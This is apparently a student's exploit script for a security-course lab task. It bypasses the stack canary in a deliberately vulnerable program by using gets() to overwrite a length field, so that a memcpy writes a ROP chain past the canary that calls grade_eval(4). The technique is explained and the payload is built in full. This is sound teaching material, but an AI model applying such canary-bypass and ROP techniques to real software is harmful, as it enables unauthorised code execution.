#!/usr/bin/env python3
"""Lab3 Task 4 -- dark-log: bypass the stack canary and call grade_eval(4).

dark-log was built with -fstack-protector: input() keeps a random canary at
rbp - 8 and calls __stack_chk_fail if it changed.  A straight gets() overflow
therefore cannot reach the saved return address.

The way around it is the function's own memcpy.  src/dark-log.c contains

    struct log_frame { char expression[128]; char logMsg[128];
                       int len; char pad[8]; } f;
    f.len = 0;
    gets(f.expression);
    memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression));

`f.len` is read *after* gets(), and it sits 256 bytes into the buffer, i.e.
*before* the canary.  So gets() can set it without ever touching the canary,
and the memcpy then becomes a write-what-where-ish primitive: it copies our
128 bytes to `logMsg + len`, which is `expression + 128 + len`.

Frame layout of input() (frame size 0x120):

    rbp - 0x120  expression[128]      offset    0 from our buffer
    rbp - 0x0a0  logMsg[128]          offset  128
    rbp - 0x020  int len              offset  256
    rbp - 0x01c  char pad[8]          offset  260
    (alignment padding)               offset  268
    rbp - 0x008  canary               offset  280
    rbp + 0x000  saved rbp            offset  288
    rbp + 0x008  return address       offset  296

With len = 160 the destination is expression + 128 + 160 = expression + 288,
which is exactly the saved rbp: the copy starts *behind* the canary, so the
canary is never modified and the check in the epilogue passes.  A gets()
string of 260 bytes is enough to set len (byte 260 is the NUL terminator, it
lands in the padding), and 260 < 280, so the canary is still untouched.

The 128 bytes we copy are the *beginning* of our payload, so:

    bytes   0..127  the ROP chain that lands at rbp
    bytes 128..255  ignored (logMsg)
    bytes 256..259  len = 160
    byte  260       NUL, written by gets()

Chain at rbp (dark-log is non-PIE, all addresses are constants):

    rbp + 0x00  dummy saved rbp
    rbp + 0x08  pop rdi ; ret   0x4018a3  (inside __libc_csu_init)
    rbp + 0x10  4
    rbp + 0x18  ret             0x4018b0  alignment
    rbp + 0x20  grade_eval      0x401677  prints "Hope A will be your grade!"
    rbp + 0x28  ret             0x4018b0  alignment
    rbp + 0x30  main            0x4017f5  loop again; EOF -> input() returns

input()'s `ret` leaves %rsp == rbp + 16 with rbp % 16 == 0, so the `ret`
gadgets are needed to enter our two functions with %rsp % 16 == 8.
"""

import struct
import sys

CANARY_STAGE = 128  # bytes copied by the memcpy
LEN_OFFSET = 256  # offset of f.len inside the input() buffer
MEMCPY_LEN = 160  # f.len we want: logMsg + 160 == rbp

POP_RDI_RET = 0x4018A3  # pop rdi ; ret  (inside __libc_csu_init's epilogue)
RET = 0x4018B0  # __libc_csu_fini: `repz ret`
GRADE_EVAL = 0x401677
MAIN = 0x4017F5


def p64(value):
    return struct.pack("<Q", value)


def p32(value):
    return struct.pack("<I", value)


chain = b"".join(
    [
        p64(0),  # dummy saved rbp
        p64(POP_RDI_RET),
        p64(4),  # grade_eval's argument
        p64(RET),  # alignment
        p64(GRADE_EVAL),  # grade_eval(4)
        p64(RET),  # alignment
        p64(MAIN),
    ]
)
assert len(chain) <= CANARY_STAGE

payload = b"".join(
    [
        chain.ljust(CANARY_STAGE, b"A"),  # gets() buffer content
        b"B" * CANARY_STAGE,  # logMsg, overwritten by the memcpy anyway
        p32(MEMCPY_LEN),  # f.len -> 160, so the copy starts at rbp
    ]
)

# gets() stops at a newline; the string must also stay short enough that it
# never reaches the canary at offset 280 (we write exactly 260 bytes).
assert b"\n" not in payload
assert len(payload) == LEN_OFFSET + 4 < 280

sys.stdout.buffer.write(payload)
